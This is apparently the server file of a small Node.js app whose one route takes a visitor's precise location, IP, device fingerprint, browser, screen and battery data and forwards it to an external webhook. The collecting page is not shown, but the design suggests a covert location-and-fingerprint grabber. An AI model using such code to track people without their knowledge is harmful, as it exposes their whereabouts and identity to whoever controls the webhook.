// server.js
const express = require("express");
const bodyParser = require("body-parser");
const cors = require("cors");
const path = require("path");
const axios = require("axios");

const app = express();

const webhookUrl = process.env.WEBHOOK_URL;


// Middleware
app.use(cors());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// Serve static files
app.use(express.static(path.join(__dirname, 'src/public')));

// Rota para receber localização e enviar para o webhook
app.post("/send-location", async (req, res) => {
  const {
    latitude,
    longitude,
    altitude,
    speed,
    heading,
    maps,
    browserInfo,
    screenInfo,
    isOnline,
    ip,
    fingerprint,
    batteryStatus
  } = req.body;

  // Formatação da mensagem para enviar
  const message = {
    location: {
      latitude,
      longitude,
      altitude,
      speed,
      heading,
      maps
    },
    browserInfo,
    screenInfo,
    isOnline,
    ip,
    fingerprint,
    batteryStatus
  };

  try {
    // Envia os dados para o webhook
    const response = await axios.post(webhookUrl, message);

    // Se a requisição for bem-sucedida
    res.status(200).json({ success: true, message: 'Dados enviados com sucesso.' });
  } catch (error) {
    console.error('Erro ao enviar dados para o webhook:', error);
    res.status(500).json({ success: false, message: 'Erro ao enviar dados para o webhook.' });
  }
});

// Inicializando o servidor
const PORT = process.env.PORT || 8088;
app.listen(PORT, () => {
  console.log(`Servidor rodando na porta ${PORT}`);
});
